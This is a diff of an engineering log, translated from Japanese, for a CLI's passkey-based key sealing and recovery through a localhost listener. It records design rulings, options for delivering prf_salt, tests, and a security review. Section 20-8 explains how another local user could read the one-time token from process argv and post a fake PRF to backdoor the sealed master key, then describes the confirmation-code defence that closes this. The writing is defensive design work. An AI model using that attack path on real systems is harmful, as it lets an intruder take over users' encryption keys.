-3. 裁定 C: ページは TS の文字列定数で同梱(HTML / JS / CSS の 3 応答 + `config.json`)、CSP `script-src 'self'` 基調、inline なし。機械検査で固定
-4. 裁定 E: コマンド面 = `key seal passkey [--label]` / `key seal list` / `key seal remove <wrap-id>` / `key recover --passkey`
-5. 裁定 G: `userVerification: "required"`、`user.id` は登録ごとの乱数、`excludeCredentials` = 台帳の全 credentialId、**PRF は登録時も `get` から取る**(登録の生体認証は 2 回)
-6. 裁定 F / I: 復元は `allowCredentials` 全件 → 応答の credential で wrapId を選ぶ。ブロブ取得は PRF の後(窓を無駄にしない)、登録の POST は最後(半端な行を残さない)
-7. 裁定 J: ブラウザ往復は CLI テストに組み込まず、テストがブラウザの代わりに POST する(Playwright を CLI の依存に足さない)
-8. 公開 docs の passkey 節は書かず、20-4 の下書きに留める(実機 K0 後に `/docs/recover-your-key` へ)
+1. Ruling A: local API auth = URL-path one-time token + `Host` / `Origin` exact match + one-time consumption + 5 minutes + uniform 404 (human-review point)
+2. Ruling B: `node:http` used as an Effect resource (bind only `127.0.0.1`; ::1 is a fallback pending real-machine K0)
+3. Ruling C: the page bundled as TS string constants (3 responses — HTML / JS / CSS — plus `config.json`), CSP `script-src 'self'` baseline, no inline. Pinned by mechanical inspection
+4. Ruling E: command surface = `key seal passkey [--label]` / `key seal list` / `key seal remove <wrap-id>` / `key recover --passkey`
+5. Ruling G: `userVerification: "required"`, `user.id` is random per registration, `excludeCredentials` = all ledger credentialIds, **PRF is taken from `get` even at registration** (2 biometrics at registration)
+6. Rulings F / I: restore passes all `allowCredentials` → picks the wrapId by the response credential. Blob fetch comes after the PRF (no window waste), registration POST is last (no partial rows)
+7. Ruling J: the browser round trip is not embedded in CLI tests; tests POST in place of the browser (no Playwright dependency added to the CLI)
+8. The public docs' passkey section is not written — stays as the 20-4 draft (goes to `/docs/recover-your-key` after real-machine K0)
 
-#### 20-5. 実装録(フェーズ B — 2026-09-13。所有者は 20-3 の 8 項目を承認)
+#### 20-5. Implementation log (phase B — 2026-09-13. The owner approved all 8 items of 20-3)
 
-**実装**: `apps/cli/src/passkey-page.ts`(HTML / JS / CSS の文字列定数 + `PrfPageConfig` / `PrfPagePost` の形)、`passkey-listener.ts`(`node:http` の 127.0.0.1 リスナー — トークン / Host / Origin / 1 回消費 / 一様 404)、`passkey.ts`(`sealPasskeyOp` / `recoverWithPasskeyOp` / `listPasskeysOp` / `removePasskeyOp`)。宣言は `effect-cli.ts`(`key seal passkey [--label]` / `key seal list` / `key seal remove <wrap-id>` / `key recover --passkey`)。サーバー・crypto・仕様は無変更(api-schema は `PASSKEY_LABEL_PATTERN` の export を足しただけ — CLI の宣言側で同じ受理形を先に検査するため。ワイヤ形は不変)。
+**Implementation**: `apps/cli/src/passkey-page.ts` (HTML / JS / CSS string constants + the `PrfPageConfig` / `PrfPagePost` shapes), `passkey-listener.ts` (a `node:http` 127.0.0.1 listener — token / Host / Origin / one-time consumption / uniform 404), `passkey.ts` (`sealPasskeyOp` / `recoverWithPasskeyOp` / `listPasskeysOp` / `removePasskeyOp`). Declarations in `effect-cli.ts` (`key seal passkey [--label]` / `key seal list` / `key seal remove <wrap-id>` / `key recover --passkey`). Server, crypto, and specs unchanged (api-schema only added the `PASSKEY_LABEL_PATTERN` export — so the CLI's declaring side can check the same acceptance shape first. Wire form unchanged).
 
-裁定(実装中に判明した点):
-- **status は passkey 行の prf_salt を運ばない**(裁定 F / I の前提のずれ)。`GET /auth/key-wraps` の `passkeys[]` は wrapId / label / credentialIdHex / updatedAtMs で、prf_salt は `GET /auth/key-wraps/passkey/:wrapId`(ブロブ取得 — 合算窓 5 回 / 時、要監視の `auth.key_wrap_fetched`)でしか得られない。よって承認済みの「`allowCredentials` 全件 → 応答の credential で行を選ぶ → ブロブ取得は PRF の後」はそのままでは成立しない。検討: ① 全行のブロブを先に取る(n 件で窓を n 消費し、使わない行にも要監視の監査事件が立つ — 不採用)。② status に `prfSaltHex` を足す(prf_salt は CRYPTO_SPEC §8.2 で「公開パラメータ。credential_id・rpId と同じ扱い」と規定されており、K3 が status に credentialIdHex を載せているのと同じ性格。ただし AUTH_SPEC §13-7 の status 行は運ぶものを列挙で限定しており、**サーバー + api-schema + 仕様文言の変更**になる — 本セッションの範囲外〔「サーバーは原則変更なし・仕様のずれは報告」〕)。③ **採用: 復元では行を 1 つ選んでから、その行のブロブだけを儀式の前に取る**(1 件なら自動、複数なら番号で選ばせる。窓の消費は常に 1、監査事件は使う行の 1 件だけ)。取り消した儀式が窓を 1 消費する(1 時間に 5 回まで)のは ③ の代償。**②は所有者への改訂提案として残す**(status に `prfSaltHex` を足せば裁定 F / I の元の形〔選択不要・ブロブ取得は PRF の後・窓の消費ゼロで取り消し可〕に戻せる。CLI 側の差分は `choosePasskeyRow` を消して `evalByCredential` に全行を渡すだけ)
-- **`key seal` は `key` の下の 3 段目**: `runCli` の段の解決(`commandKeyOf`)を「既知の段が続く限り深く」へ一般化し、`GROUP_CONFIGS` に `"key seal"` を入れ子グループとして登録(親 `key` の取りうる操作に `seal` を数える)。ヘルプ golden・不明サブコマンド診断は機械導出のまま
-- **`--label` の受理形は宣言側で検査**(`Flag.withSchema` + `PASSKEY_LABEL_MESSAGE` を `SAFE_EXPECTATIONS` へ)。サーバー往復前に exit 2
-- **`wrapOwnBlobForHandoff` → `wrapOwnBlob`**(master-ops.ts): kind = device / passkey-prf の共通本体。文言から「for the handoff」を外した
-- **ページの理由コード**: `not-allowed`(取消 / タイムアウト / 該当なし)/ `already-registered`(`excludeCredentials` の `InvalidStateError`)/ `prf-unsupported`(`create` の `enabled` が false、または `get` に `results.first` が無い)/ `unexpected`。ページは自由文を送らず、CLI が英語の案内に写す
-- **復元の credential 照合**: ページが返した credential id が取得した行の credential id と違えば復元しない(`allowCredentials` 1 件なので起きないが fail-closed)
-- **テスト**: `passkey-listener.test.ts`(9 件 — トークン / Host / Origin / content-type / 本文不正 / 上限超過 / 2 回目 / close、`parsePrfPost`、ページ資産の機械検査〔inline script・style・イベント属性・javascript:・第三者 URL・eval・innerHTML の不在、`userVerification: "required"` × 3、CSP〕)、`passkey.test.ts`(12 件 — 登録の roundtrip〔台帳の行を `derivePasskeyKek` + master-wrap AAD で開け、別 wrap_id へは移植不能〕、`--label`、`excludeCredentials` と上限 5、理由コード 4 種、ゲート 3 種、復元の roundtrip〔ブロブ取得は 1 回〕、複数登録の番号選択と取消、違う PRF / 違う credential / 理由コード、登録なし / 既存鍵 / エージェント / 非端末 / 429、`--handoff` + `--passkey` の同時指定、`seal list` / `seal remove`)。ブラウザ役は `TestEnv.setBrowserOpenHandler`(裁定 J)。ヘルプ golden 更新、文言規約は機械検査を通過
+Rulings (points discovered during implementation):
+- **status does not carry passkey rows' prf_salt** (a deviation from ruling F / I's premise). `GET /auth/key-wraps`' `passkeys[]` returns wrapId / label / credentialIdHex / updatedAtMs; prf_salt is only available via blob fetch `GET /auth/key-wraps/passkey/:wrapId` (combined window 5/hour, the must-watch `auth.key_wrap_fetched`). So the approved "all `allowCredentials` → pick the row by the response credential → blob fetch after the PRF" doesn't hold as-is. Considered: ① fetch all rows' blobs first (consumes n of the window and raises a must-watch audit event on unused rows — rejected). ② Add `prfSaltHex` to status (prf_salt is specified in CRYPTO_SPEC §8.2 as "a public parameter, same treatment as credential_id / rpId" — same character as K3 already carrying credentialIdHex on status. But AUTH_SPEC §13-7's status line enumerates what it carries, so it becomes a **server + api-schema + spec-wording change** — outside this session's scope〔"the server is in principle unchanged; spec deviations are reported"〕). ③ **Adopted: at restore, pick one row first, then fetch only that row's blob before the ceremony** (automatic if one row, a number prompt if several. Window consumption is always 1; the audit event lands only on the used row). A cancelled ceremony consuming 1 window (up to 5 per hour) is ③'s price. **② is kept as a revision proposal to the owner** (adding `prfSaltHex` to status restores ruling F / I's original shape〔no selection needed, blob fetch after the PRF, zero window cost for cancellation〕. The CLI-side delta is just removing `choosePasskeyRow` and passing all rows to `evalByCredential`)
+- **`key seal` is a third level under `key`**: generalized `runCli`'s level resolution (`commandKeyOf`) to "descend while known levels continue", and registered `"key seal"` in `GROUP_CONFIGS` as a nested group (`seal` counts among parent `key`'s possible operations). Help golden and unknown-subcommand diagnosis remain mechanically derived
+- **`--label`'s acceptance shape is checked on the declaring side** (`Flag.withSchema` + `PASSKEY_LABEL_MESSAGE` added to `SAFE_EXPECTATIONS`). Exit 2 before any server round trip
+- **`wrapOwnBlobForHandoff` → `wrapOwnBlob`** (master-ops.ts): the common body for kind = device / passkey-prf. Removed "for the handoff" from the wording
+- **Page reason codes**: `not-allowed` (cancel / timeout / no match) / `already-registered` (`excludeCredentials`' `InvalidStateError`) / `prf-unsupported` (`create`'s `enabled` false, or no `results.first` on `get`) / `unexpected`. The page sends no free text; the CLI maps to English guidance
+- **Restore credential matching**: if the credential id the page returned differs from the fetched row's credential id, don't restore (can't happen since allowCredentials carries one entry, but fail-closed)
+- **Tests**: `passkey-listener.test.ts` (9 cases — token / Host / Origin / content-type / malformed body / over-limit / second request / close, `parsePrfPost`, page-asset mechanical inspection〔absence of inline script / style / event attributes / javascript: / third-party URLs / eval / innerHTML, `userVerification: "required"` × 3, CSP〕), `passkey.test.ts` (12 cases — register round trip〔the ledger row opens via `derivePasskeyKek` + master-wrap AAD and can't be transplanted to another wrap_id〕, `--label`, `excludeCredentials` and the cap of 5, the 4 reason codes, the 3 gates, restore round trip〔blob fetched once〕, number selection and cancel on multiple registrations, wrong PRF / wrong credential / reason codes, no-registration / existing-key / agent / non-terminal / 429, `--handoff` + `--passkey` together, `seal list` / `seal remove`). The browser role is `TestEnv.setBrowserOpenHandler` (ruling J). Help golden updated; wording conventions pass the mechanical inspection
 
-#### 20-6. 改訂提案の再探索 — 復元時の prf_salt の入手経路(2026-09-13 所有者依頼: 銀の弾丸 / 上位互換を出し切る)
+#### 20-6. Re-exploration of the revision proposal — how restore obtains prf_salt (2026-09-13, owner request: exhaust the silver-bullet / superset search)
 
-**問題の定義**: 復元の儀式(WebAuthn `get` + PRF)には、その credential の `prf_salt` が**儀式の前に**要る。台帳の状態 `GET /auth/key-wraps` は passkey 行の `wrapId / label / credentialIdHex / updatedAtMs` だけを返し、`prf_salt` はブロブ取得 `GET /auth/key-wraps/passkey/:wrapId`(合算窓 5 回 / 時 + 要監視の監査事件 `auth.key_wrap_fetched`)にしか無い。欲しい性質: (a) 複数登録でも利用者が選ばない、(b) 取り消した儀式が窓と監査事件を消費しない、(c) 仕様・サーバーの変更が最小、(d) crypto 無変更、(e) 安全性は同等。
+**Problem definition**: the restore ceremony (WebAuthn `get` + PRF) needs that credential's `prf_salt` **before the ceremony**. The ledger state `GET /auth/key-wraps` returns only passkey rows' `wrapId / label / credentialIdHex / updatedAtMs`; `prf_salt` exists only on the blob fetch `GET /auth/key-wraps/passkey/:wrapId` (combined window 5/hour + the must-watch audit event `auth.key_wrap_fetched`). Desired properties: (a) the user doesn't choose even with multiple registrations, (b) a cancelled ceremony consumes no window or audit event, (c) minimal spec / server change, (d) crypto unchanged, (e) equal safety.
 
-| # | 案 | 変更箇所 | (a) 選択不要 | (b) 取消の窓消費 | 評価 |
+| # | Option | Change sites | (a) No selection | (b) Cancellation's window cost | Evaluation |
 |---|---|---|---|---|---|
-| ③ | **現状**: 行を 1 つ選ぶ(1 件なら自動)→ その行のブロブを取る → 儀式 | なし(実装済み) | 複数なら番号入力 | 1 | 動く。復元は稀なので実害は小さいが、失敗 5 回で 1 時間待ち |
-| ① | 全行のブロブを先に取る | CLI | ○ | n | 窓 n 消費 + 使わない行に要監視事件。不採用 |
-| ② | **status に `prfSaltHex` を足す** | AUTH_SPEC §13-7 の status 行の文言 + サーバー 1 フィールド(`params` から写すだけ)+ api-schema + CLI 小 | ○ | 0 | prf_salt は CRYPTO_SPEC §8.2 で「公開パラメータ。credential_id・rpId と同じ扱い」— status が既に credentialIdHex を運ぶのと同格。セッション主体(Web)にも見えるが、salt 単体では認証器 + UV が無いと何もできない |
-| ②′ | ② の上位互換: **`prfSaltHex` を optional にし、CLI は「status にあれば使う、無ければ ③」** | ② と同じ + CLI の分岐 1 つ | ○(新サーバー) | 0(新サーバー) | セルフホストの版ずれ(旧サーバー × 新 CLI)でも壊れない。**推奨** |
-| ④ | salt を乱数でなく **`wrap_id` からの導出**にする(例: `SHA-256(LP("maruhi/v1/passkey-salt", wrap_id))`)。wrap_id は status にあるので CLI が再計算できる | CRYPTO_SPEC §8.2 の「登録ごとの乱数」を「登録ごとの一意な公開値(wrap_id 由来)」へ改訂 + 新しい導出式の仕様化 + CLI 小(ページは無変更) | ○ | 0 | **銀の弾丸候補**(輸送の問題自体が消え、サーバー変更ゼロ)。安全性: wrap_id は登録ごとの乱数 ULID なので「再登録 = 新 KEK」の意味論は保たれる(登録は常に `create` = 新 credential + 新 wrap_id)。欠点: 暗号仕様の規範文と新しいハッシュ導出を足す(仕様にない暗号操作の禁止 → 改訂 → 承認が要る)。既存の乱数 salt の行とは ②′ と同じフォールバック(status に無ければ fetch)で共存 |
-| ④′ | ④ の変種: salt = `SHA-256(credential_id)` をページで計算 | ④ と同じ + ページで digest | ○ | 0 | ④ より劣る(ページに計算が増え、登録時は create 後にしか決まらない) |
-| ⑤ | **二段の儀式**: PRF 無しの `get`(全 credential)で使う credential を知る → その行のブロブを取る → PRF ありの `get` | CLI + ページ | ○ | 0(1 回目の前)/ 1(間) | 仕様変更ゼロだが復元の生体認証が 2 回に増える。UX の劣化と引き換えに ② の効果の一部だけ |
-| ⑥ | パラメータ専用の新エンドポイント(`…/passkey/:wrapId/params`) | 仕様 + サーバー(新 API) | ○ | 0 | ② より変更が大きい。不採用 |
-| ⑦ | salt を認証器側に置く(WebAuthn `largeBlob`) | ページ | ○ | 0 | 対応が狭く実機未検証。不採用 |
-| ⑧ | 登録端末の設定ファイルに salt を控える | CLI | — | — | 復元は別端末なので成立しない。不採用 |
+| ③ | **Current**: pick one row (automatic if single) → fetch that row's blob → ceremony | None (implemented) | Number input if multiple | 1 | Works. Restore is rare so the practical harm is small, but 5 failures = a 1-hour wait |
+| ① | Fetch all rows' blobs first | CLI | ○ | n | n window consumed + must-watch events on unused rows. Rejected |
+| ② | **Add `prfSaltHex` to status** | AUTH_SPEC §13-7 status-line wording + 1 server field (just copy from `params`) + api-schema + small CLI change | ○ | 0 | prf_salt is specified in CRYPTO_SPEC §8.2 as "a public parameter, same treatment as credential_id / rpId" — same rank as status already carrying credentialIdHex. Session principals (the web) can see it too, but a salt alone does nothing without the authenticator + UV |
+| ②′ | Superset of ②: **make `prfSaltHex` optional; the CLI "uses it if present on status, else ③"** | Same as ② + 1 CLI branch | ○ (new server) | 0 (new server) | Doesn't break on self-hosted version skew (old server × new CLI). **Recommended** |
+| ④ | Make the salt not random but **derived from `wrap_id`** (e.g. `SHA-256(LP("maruhi/v1/passkey-salt", wrap_id))`). wrap_id is on status, so the CLI can recompute | CRYPTO_SPEC §8.2 revision from "random per registration" to "a unique public value per registration (derived from wrap_id)" + specifying the new derivation + small CLI change (page unchanged) | ○ | 0 | **Silver-bullet candidate** (the transport problem itself disappears, zero server change). Safety: wrap_id is a random ULID per registration, so "re-register = new KEK" semantics is preserved (registration is always `create` = new credential + new wrap_id). Drawback: adds normative crypto-spec text and a new hash derivation (the no-off-spec-crypto rule → revision → approval needed). Coexists with existing random-salt rows via the same fallback as ②′ (fetch if absent on status) |
+| ④′ | Variant of ④: salt = `SHA-256(credential_id)` computed on the page | Same as ④ + a digest on the page | ○ | 0 | Worse than ④ (more computation on the page; at registration it's only decided after create) |
+| ⑤ | **Two-stage ceremony**: a PRF-less `get` (all credentials) learns the credential → fetch that row's blob → a `get` with PRF | CLI + page | ○ | 0 (before 1st) / 1 (between) | Zero spec change but restores gain a second biometric. Trades UX degradation for only part of ②'s effect |
+| ⑥ | A dedicated new endpoint for parameters (`…/passkey/:wrapId/params`) | Spec + server (new API) | ○ | 0 | Larger change than ②. Rejected |
+| ⑦ | Put the salt on the authenticator (WebAuthn `largeBlob`) | Page | ○ | 0 | Narrow support, unverified on real hardware. Rejected |
+| ⑧ | Record the salt in the registering device's config file | CLI | — | — | Restore is on a different device, so this can't work. Rejected |
 
-**銀の弾丸の探索**: 「salt を運ばなくてよくする」= ④(導出)が唯一。ただし暗号仕様の改訂が要り、②′ が API 文言の改訂で同じ効果を得られるので、④ は「サーバーを触れない事情があるとき」の代替に留まる。**上位互換の探索**: ② に optional + フォールバックを足した ②′ が ② の上位互換(版ずれ耐性)。⑤ は仕様無変更の上位互換に見えるが UX を落とす(生体認証 2 回)ので ③ の上位互換とは言えない。新案が 1 巡出なくなったので終了。
+**Silver-bullet search**: "make the salt not need transporting" = ④ (derivation) is the only one. But it requires a crypto-spec revision, and since ②′ achieves the same effect with an API-wording revision, ④ stays as the alternative "for when touching the server is impossible". **Superset search**: adding optional + fallback to ② gives ②′, a superset of ② (version-skew tolerance). ⑤ looks like a zero-spec-change superset but degrades UX (2 biometrics), so it isn't a superset of ③. No new options emerged in one round → done.
 
-**推奨 = ②′**。理由: 規範の変更が最小(AUTH_SPEC §13-7 の列挙に「公開パラメータ credentialIdHex / prfSaltHex」を足すだけ。CRYPTO_SPEC は不変)、承認済みの裁定 F / I の形(選択不要・ブロブ取得は PRF の後・取り消し無料)に戻る、旧サーバーとも共存する。所有者が「今は触らない」なら ③ のまま(動作は正しい)。所有者が「サーバーは触りたくないが (a)(b) は欲しい」なら ④ を CRYPTO_SPEC 改訂案として起草する。
+**Recommendation = ②′**. Reasons: minimal normative change (only adds "the public parameters credentialIdHex / prfSaltHex" to AUTH_SPEC §13-7's enumeration; CRYPTO_SPEC unchanged), returns to the approved ruling F / I shape (no selection, blob fetch after the PRF, free cancellation), and coexists with old servers. If the owner says "don't touch it now", ③ stays (the behavior is correct). If the owner says "don't want to touch the server but do want (a) and (b)", ④ is drafted as a CRYPTO_SPEC revision proposal.
 
-#### 20-7. ②′ の実装録(2026-09-13 — 所有者裁定「②′ で進める。#169 のマージ後に別 PR」)
+#### 20-7. Implementation log of ②′ (2026-09-13 — owner ruling "proceed with ②′, in a separate PR after #169 merges")
 
-- **仕様**: AUTH_SPEC §13-7 の status 行に「passkey 行の公開パラメータ `credentialIdHex` / `prfSaltHex` を運ぶ」を追記(CRYPTO_SPEC は不変 — salt は乱数のまま)
-- **api-schema**: `KeyWrapStatusSchema.passkeys[].prfSaltHex` を必須の `hexString(32)` で追加
-- **サーバー**: status ハンドラで `params.prfSaltHex` を写すだけ(1 行)。テスト `key-wraps.test.ts` の status 断言に `prfSaltHex` を追加
-- **CLI**(`passkey.ts`): 復元は `recoverCeremonyFirst` の 1 経路: 全 credential を `allowCredentials` + `evalByCredential` で渡して儀式 → 応答の credential の行 → その行のラップだけ取得 → 復号(`unwrapAndStore`)。**ブロブ取得は儀式の後**なので取り消しは窓を消費せず、番号入力も無い(承認済みの裁定 F / I の形)。20-5 の「行を選ぶ → 取得 → 儀式」は撤去。応答の credential が台帳に無い / 取得したラップの credential が行と食い違う場合は fail-closed
-- **テスト**(`passkey.test.ts`): 復元(儀式時点でブロブ未取得・取得は 1 件・番号入力なし・取り消し / 未登録 credential / 違う PRF / 食い違うラップの拒否・儀式後の 429)と前提の拒否を固定
-- 20-6 の ④(salt の導出)は採らない(暗号仕様の改訂と 2 形の共存を背負わない — 所有者の運用負担で ②′ が軽い)
-- **旧サーバー向けフォールバックの裁定**(PR #170 の pullfrog 指摘 — 「互換シムに撤去条件が無い」→ 2026-09-13 所有者裁定「今捨てる」): 当初の ②′ は `prfSaltHex` をワイヤ上省略可にし、無ければ 20-5 の形(行を選ぶ → 取得 → 儀式)へ落ちる `recoverFetchFirst` / `choosePasskeyRow` を持っていた。撤去条件の候補は (a) 招待制ベータ開放(ROADMAP H6)で撤去、(b) CLI の最低サーバー版ポリシーを先に作る、(c) マージ前に撤去 — の 3 つで、**(c) を採った**。理由: 本改訂より古いサーバーの利用者は所有者本人だけで、互換コードが main に入る前に消すのが最も安い(撤去 PR も基準の議論も不要)。代償は「新 CLI を未更新のサーバーに向け、その口座に passkey 行が 1 つでもあると、台帳の状態(`KeyWrapStatusSchema`)を読む**すべて**のコマンド(`key seal list` / `key seal passkey` の上限検査 / `guardian list` / `key recover --handoff` / `key recover --passkey`)が応答のスキーマ検証で明示的に失敗する」こと(`renderSchemaFailure` が欠けたパスと『CLI とサーバーの版を揃えよ』の案内を出す。書き込みは起きない。passkey 行の無い口座は影響を受けない)で、マージ後に `wrangler deploy` を先にすれば影響は無い。共有スキーマの必須フィールド追加は、その応答を読む全コマンドを代償に数える(pullfrog の指摘)。**②′ は ② と同じ形(必須フィールド)に収束した**
-#### 20-8. 裁定 A 改訂 1 — 別 UID のローカル利用者と確認コード(2026-09-13、PR #169 の pullfrog レビュー対応)
+- **Spec**: append to AUTH_SPEC §13-7's status line "carries passkey rows' public parameters `credentialIdHex` / `prfSaltHex`" (CRYPTO_SPEC unchanged — the salt stays random)
+- **api-schema**: add `KeyWrapStatusSchema.passkeys[].prfSaltHex` as a required `hexString(32)`
+- **Server**: the status handler copies `params.prfSaltHex` (1 line). The `key-wraps.test.ts` status assertion gains `prfSaltHex`
+- **CLI** (`passkey.ts`): restore is the single `recoverCeremonyFirst` path: pass all credentials as `allowCredentials` + `evalByCredential` into the ceremony → the row of the response credential → fetch only that row's wrap → decrypt (`unwrapAndStore`). **The blob fetch is after the ceremony**, so cancellation consumes no window and there's no number input (the approved ruling F / I shape). 20-5's "pick a row → fetch → ceremony" is removed. If the response credential is absent from the ledger / the fetched wrap's credential disagrees with the row — fail-closed
+- **Tests** (`passkey.test.ts`): pin restore (no blob fetched at ceremony time, fetch of 1 item, no number input, refusal on cancel / unregistered credential / wrong PRF / mismatched wrap, 429 after the ceremony) and precondition refusals
+- 20-6's ④ (salt derivation) is not adopted (don't take on a crypto-spec revision + a two-shape coexistence — operationally ②′ is lighter for the owner)
+- **Ruling on the old-server fallback** (PR #170, pullfrog point — "the compatibility shim has no removal condition" → 2026-09-13 owner ruling "drop it now"): the original ②′ made `prfSaltHex` optional on the wire and fell back to 20-5's shape (pick a row → fetch → ceremony) via `recoverFetchFirst` / `choosePasskeyRow`. Removal-condition candidates were (a) remove at invite-beta opening (ROADMAP H6), (b) build a minimum-server-version policy for the CLI first, (c) remove before merge — **(c) was adopted**. Reason: the only user of a server older than this revision is the owner himself; removing the compatibility code before it enters main is cheapest (no removal PR or criteria debate needed). The price: "point a new CLI at an un-updated server and any account with even one passkey row will have **every** command that reads ledger state (`KeyWrapStatusSchema`) — `key seal list` / `key seal passkey`'s cap check / `guardian list` / `key recover --handoff` / `key recover --passkey` — fail explicitly on response schema validation" (`renderSchemaFailure` reports the missing path plus "keep the CLI and server versions in step" guidance. No writes happen. Accounts with no passkey row are unaffected), and if `wrangler deploy` runs first after merge there's no impact. Adding a required field to a shared schema counts every command reading that response as a price (pullfrog's point). **②′ converged to the same shape as ② (a required field)**
 
-**指摘**(pullfrog): 裁定 A の脅威モデルは「他の localhost ページ」だけを敵に置いており、`Host` / `Origin` の完全一致はブラウザ発の要求にしか効かない。生ソケットの相手には URL トークンだけが門で、そのトークンはブラウザ起動(`xdg-open` / `open` / `rundll32`)の **argv** に載る = Linux の既定では `/proc/<pid>/cmdline` が全ユーザーに読める。同じマシンの別 UID の利用者が 5 分の窓の間にトークンを拾い、偽の PRF を POST すれば、**登録の経路では被害者の CLI が攻撃者の知る KEK で master 鍵を封印して台帳へ上げる**(耐久性のある裏口。ブロブ取得には本人の認証が要るので即時の漏洩ではないが、後日トークンが盗まれれば passkey 無しで開く)。復元の経路は credential の照合 + AEAD で偽 POST が失敗(DoS 止まり)。`agent.ts` が 0700 ディレクトリで同じ敵を除外している以上、この敵は maruhi の脅威モデルの内側である。
+#### 20-8. Ruling A revision 1 — other-UID local users and the confirmation code (2026-09-13, pullfrog review response on PR #169)
 
-**検討**: ① 認証器の関与の証明(CLI 生成 challenge + assertion 署名の検証): 攻撃者は**自分の**認証器で儀式全体を偽装できる(登録では credential 自体が攻撃者のもの)ため、この敵には閉じない。しかも新しい暗号操作 = CRYPTO_SPEC 改訂。不採用。② 自動起動をやめて URL 表示のみ: 端末のリンクをクリックしても `xdg-open` が呼ばれ argv に載る。手で貼る利用者にしか効かない。不採用。③ 接続元 UID の照合(`/proc/net/tcp` の uid): Linux 限定。不採用(退避案として記録)。④ 初回 GET で消費する短命トークンと本トークンの 2 段: 競争を狭めるだけで閉じない。不採用。⑤ ページが表示するコードを端末へ打つ: 攻撃者の偽 POST が儀式を**消費**し、被害者のページは 404 になる(利用者が気づく前提)。⑥ **端末に表示した 6 桁の確認コードを利用者がページへ打ち込み、POST に同梱させる**(採用): コードは利用者の端末とブラウザの間だけを通り、argv にも HTTP 応答にも載らない(別 UID は被害者の tty も画面も読めない)。コード不一致の POST は 404 で**消費しない**ので、偽 POST が先に届いても正しいページの POST が後から通る。総当たりは 5 回で儀式ごと打ち切る(fail-closed。10^6 に対して 5 回)— この打ち切りは同じ敵に「偽 POST 5 回で儀式を中断させる」手段を残すので、**登録の裏口はローカル DoS へ格下げされる(除外ではない)**。中断の案内文は打ち間違いと「同じマシンの別プロセスが要求を送っている」可能性の両方を名指しする。登録・復元とも同じ形(復元は DoS 止まりだが、一様にして偽 POST による中断も塞ぐ)。比較は定数時間。
+**Finding** (pullfrog): ruling A's threat model placed only "other localhost pages" as the enemy, and the `Host` / `Origin` exact match only works on browser-issued requests. Against raw sockets the URL token is the only gate, and that token rides on the **argv** of the browser launch (`xdg-open` / `open` / `rundll32`) = on Linux by default `/proc/<pid>/cmdline` is readable by all users. A user on a different UID of the same machine can pick up the token inside the 5-minute window and POST a fake PRF — **on the registration path the victim's CLI seals the master key under a KEK the attacker knows and uploads it to the ledger** (a durable backdoor. Not an immediate leak since blob fetch needs the owner's auth, but if the token is later stolen it opens without a passkey). On the restore path the credential match + AEAD makes the fake POST fail (DoS at most). Since `agent.ts` already excludes this same enemy with a 0700 directory, this enemy is inside maruhi's threat model.
 
-**実装**: `passkey.ts` が `newConfirmCode()`(一様乱数 6 桁、棄却で偏りを消す)を端末へ `123 456` の形で表示、`passkey-listener.ts` は `startPrfListener(config, confirmCode)` で受け取り、POST の `code` を照合(不一致 404・`MAX_CODE_ATTEMPTS = 5` で `too-many-code-attempts`)、`passkey-page.ts` は入力欄を持ち、不一致なら同じ儀式結果を打ち直して再送する(生体認証はやり直さない)。CSP・inline なしは不変(入力欄はイベントリスナで扱う)。テスト: リスナー(コード無し / 不一致 / 打ち切り)、CLI(偽 POST → 正しい POST の順で通る、総当たりで儀式失敗)。
+**Considered**: ① Proof of authenticator involvement (verify a CLI-generated challenge + assertion signature): the attacker can fake the whole ceremony with **their own** authenticator (at registration the credential itself is the attacker's), so this doesn't close against this enemy. Plus it's a new crypto operation = CRYPTO_SPEC revision. Rejected. ② Drop auto-open, show the URL only: clicking the terminal link still calls `xdg-open` and lands on argv. Only helps users who paste by hand. Rejected. ③ Check the connection's UID (`/proc/net/tcp`'s uid): Linux-only. Rejected (recorded as a fallback). ④ Two-stage tokens — a short-lived token consumed by the first GET plus a real token: only narrows the race, doesn't close it. Rejected. ⑤ Type a code shown by the page into the terminal: the attacker's fake POST **consumes** the ceremony and the victim's page gets a 404 (assumes the user notices). ⑥ **Show a 6-digit confirmation code on the terminal; the user types it into the page and it's carried on the POST** (adopted): the code travels only between the user's terminal and browser — it lands on neither argv nor any HTTP response (a different UID can read neither the victim's tty nor screen). A POST with a wrong code gets a 404 and **doesn't consume** the ceremony, so even if a fake POST arrives first, the real page's POST goes through after. Brute force aborts the whole ceremony after 5 attempts (fail-closed. 5 tries against 10^6) — since this abort leaves the same enemy a means of "interrupting the ceremony with 5 fake POSTs", **the registration backdoor is downgraded to a local DoS (not eliminated)**. The abort message names both a typo and the possibility of "another process on the same machine sending requests". Same shape for registration and restore (restore is DoS-only already, but making it uniform also blocks interruption via fake POSTs). Comparison is constant-time.
 
-**残余**: 別 UID の利用者はトークンでページ資産(公開コード)と `config.json`(公開パラメータ)を読め、偽 POST 5 回で儀式を中断できる(ローカル DoS — 再実行のたびに繰り返せる)。鍵素材は無く、封印・復元の結果を左右することはできない。裁定 A の脅威モデルに「同一マシンの別 UID の利用者」を明記し、確認コードで閉じることを追記した(本節が改訂録)。CRYPTO_SPEC §8.2 の「ワンタイムトークン + Origin 検査」は据え置き(追加の層であり、規範の緩和ではない)。②′(status に `prfSaltHex`)との相互作用: salt は仕様上の公開パラメータで、PRF 出力が盗まれれば salt の露出に関係なく KEK は導ける(KEK = HKDF(prf_out))。salt を隠しても防御にならないので、②′ は本件の敵に対して何も広げない。
+**Implementation**: `passkey.ts` displays `newConfirmCode()` (6-digit uniform random, rejection sampling to remove bias) on the terminal in `123 456` form; `passkey-listener.ts` receives it via `startPrfListener(config, confirmCode)` and compares the POST's `code` (mismatch → 404; `MAX_CODE_ATTEMPTS = 5` → `too-many-code-attempts`); `passkey-page.ts` has an input field and on mismatch re-sends the same ceremony result (the biometric is not redone). CSP / no-inline unchanged (the input field is handled via an event listener). Tests: listener (no code / mismatch / abort), CLI (fake POST then correct POST passes in order, brute force fails the ceremony).
 
-#### 20-4. 実機検証後に `/docs/recover-your-key` へ追記する内容の下書き(公開しない — 検証していないことを書かない)
